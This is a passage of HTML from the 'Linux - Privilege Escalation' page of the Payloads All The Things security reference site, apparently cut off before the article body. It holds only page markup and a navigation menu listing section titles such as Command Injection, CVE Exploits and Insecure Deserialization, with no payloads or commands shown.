
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../Linux%20-%20Persistence/">
      
      
        <link rel="next" href="../MSSQL%20Server%20-%20Cheatsheet/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.1">
    
    
      
        <title>Linux - Privilege Escalation - Payloads All The Things</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.402914a4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.a0c5b2b5.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
  
    
    
      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#linux-privilege-escalation" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Payloads All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Linux - Privilege Escalation
            
          </span>
        </div>
      </div>
    </div>
    
      <form class="md-header__option" data-md-component="palette">
        
          
          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
          
            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
            </label>
          
        
          
          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
          
            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
            </label>
          
        
      </form>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Payloads All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Payloads All The Things
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../CONTRIBUTING/" class="md-nav__link">
        CONTRIBUTING
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
      
      
      
        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          API Key Leaks
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          API Key Leaks
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../API%20Key%20Leaks/" class="md-nav__link">
        API Key Leaks
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
      
      
      
        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
          AWS Amazon Bucket S3
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          AWS Amazon Bucket S3
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
        Amazon Bucket S3 AWS
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
      
      
      
        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
          Account Takeover
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Account Takeover
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Account%20Takeover/" class="md-nav__link">
        Account Takeover
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
      
      
      
        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
          Argument Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Argument Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Argument%20Injection/" class="md-nav__link">
        Argument Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
      
      
      
        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
          CORS Misconfiguration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          CORS Misconfiguration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CORS%20Misconfiguration/" class="md-nav__link">
        CORS Misconfiguration
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
      
      
      
        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
          CRLF Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          CRLF Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CRLF%20Injection/" class="md-nav__link">
        Carriage Return Line Feed
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
      
      
      
        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
          CSRF Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          CSRF Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CSRF%20Injection/" class="md-nav__link">
        Cross-Site Request Forgery
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
      
      
      
        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
          CSV Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_10">
          <span class="md-nav__icon md-icon"></span>
          CSV Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CSV%20Injection/" class="md-nav__link">
        CSV Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
      
      
      
        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
          CVE Exploits
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11">
          <span class="md-nav__icon md-icon"></span>
          CVE Exploits
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE%20Exploits/" class="md-nav__link">
        Common Vulnerabilities and Exposures
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE%20Exploits/Log4Shell/" class="md-nav__link">
        CVE-2021-44228 Log4Shell
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
      
      
      
        <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
          Command Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_12">
          <span class="md-nav__icon md-icon"></span>
          Command Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Command%20Injection/" class="md-nav__link">
        Command Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
      
      
      
        <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
          DNS Rebinding
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_13">
          <span class="md-nav__icon md-icon"></span>
          DNS Rebinding
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../DNS%20Rebinding/" class="md-nav__link">
        DNS Rebinding
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
      
      
      
        <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
          Dependency Confusion
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_14">
          <span class="md-nav__icon md-icon"></span>
          Dependency Confusion
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Dependency%20Confusion/" class="md-nav__link">
        Dependency Confusion
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
      
      
      
        <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
          Directory Traversal
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_15">
          <span class="md-nav__icon md-icon"></span>
          Directory Traversal
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Directory%20Traversal/" class="md-nav__link">
        Directory Traversal
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
      
      
      
        <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
          File Inclusion
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_16">
          <span class="md-nav__icon md-icon"></span>
          File Inclusion
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../File%20Inclusion/" class="md-nav__link">
        File Inclusion
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
      
      
      
        <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
          GraphQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_17">
          <span class="md-nav__icon md-icon"></span>
          GraphQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../GraphQL%20Injection/" class="md-nav__link">
        GraphQL Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
      
      
      
        <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
          HTTP Parameter Pollution
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_18">
          <span class="md-nav__icon md-icon"></span>
          HTTP Parameter Pollution
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../HTTP%20Parameter%20Pollution/" class="md-nav__link">
        HTTP Parameter Pollution
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
      
      
      
        <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
          Insecure Deserialization
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_19">
          <span class="md-nav__icon md-icon"></span>
          Insecure Deserialization
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/" class="md-nav__link">
        Insecure Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/DotNET/" class="md-nav__link">
        .NET Serialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Java/" class="md-nav__link">
        Java Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Node/" class="md-nav__link">
        Node Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/PHP/" class="md-nav__link">
        PHP Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Python/" class="md-nav__link">
        Python Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Ruby/" class="md-nav__link">
        Ruby Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/YAML/" class="md-nav__link">
        YAML Deserialization
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
      
      
      
        <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="0">
          Insecure Direct Object References
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_20">
          <span class="md-nav__icon md-icon"></span>
          Insecure Direct Object References
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Direct%20Object%20References/" class="md-nav__link">
        Insecure Direct Object References
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
      
      
      
